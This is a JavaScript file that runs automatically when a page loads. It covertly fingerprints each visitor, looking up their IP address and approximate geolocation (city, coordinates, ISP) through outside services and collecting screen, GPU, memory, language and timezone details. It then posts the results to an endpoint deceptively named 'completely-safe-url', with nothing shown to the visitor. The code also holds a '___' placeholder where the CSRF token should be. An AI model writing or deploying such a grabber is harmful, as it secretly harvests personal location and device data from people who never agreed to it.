
async function send() {
    var tism1 = await(await fetch("https://wtfismyip.com/json").catch()).json().catch();
    var tism2 = await(await fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${tism1.YourFuckingIPAddress}`).catch()).json().catch();
    var data = {}
        
    function push(k,v) {
        data[k] = v
    }

    if (tism1 && tism2) {
        data["IP Address"] = tism2.query
        data["Hostname"] = tism1.YourFuckingHostname
        data["Country"] = `${tism2.country} (${tism2.countryCode})`
        data["Region"] = `${tism2.regionName} (${tism2.region})`
        data["City"] = tism2.city
        data["Latitude"] = tism2.lat
        data["Longitude"] = tism2.lon
        data["ISP"] = tism1.YourFuckingISP
        data["Autonomous System"] = tism2.as
    } else {
        data["IP Address"] = "::ffff:172.70.126.134"
    }

    push("User Agent", navigator.userAgent);
    push("Connection Method", "GET");
    push("Request URL", "/");
    push("Request Path", "/");
    push("Request Protocol", "http");
    push("Secure Connection", false ? "Yes" : "No");
    push("Proxy IPs", "[]");
    push("Window Properies", Object.keys(window).length);
    push("Window Width", window.innerWidth, "px");
    push("Window Height", window.innerHeight, "px");
    push("Window Ratio", `${window.innerWidth / window.innerHeight}/1`);
    push("Screen Width", window.screen.availWidth, "px");
    push("Screen Height", window.screen.availHeight, "px");
    push("Screen Ratio", `${window.screen.availWidth / window.screen.availHeight}/1`);
    push("Screen Pixel Ratio", window.devicePixelRatio, "/1");
    push("Screen DPI", window.devicePixelRatio);
    push("Screen Color Depth", window.screen.colorDepth);
    push("Screen Orientation", `${window.screen.orientation.type} (${window.screen.orientation.angle}°)`);
    push("Screen Rotation", window.screen.orientation.angle);
    push("OS", `${navigator.platform}`);
    push("Available Browser Memory", typeof window.performance.memory != "undefined" ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, "MB");
    push("CPU Threads", `${navigator.hardwareConcurrency}`);

        
    const canvas = document.createElement("canvas");
    let gl;
    let debugInfo;
    try {
        gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    } catch (e) {}
    if (gl && debugInfo) {
        push("GPU Vendor", gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
        push("GPU Info", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
    }
    push("Device Memory", `${navigator.deviceMemory}`);
    push("System Languages", navigator.languages.join(", "));
    push("Language", `${navigator.language}`);
    let date = new Date();
    push("Current Time", `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`);
    if (tism2) push("Timezone", tism2.timezone);
    push("Timezone Offset", date.getTimezoneOffset() / 60, " hours");

    $.ajax({
        type:"POST",
        url:"/data/completely-safe-url",
        dataType: "json",
        data: {
            csrfmiddlewaretoken: ___,
            data: JSON.stringify(data),
        },
    })
}


$(document).ready(function(){

    send()
    
});
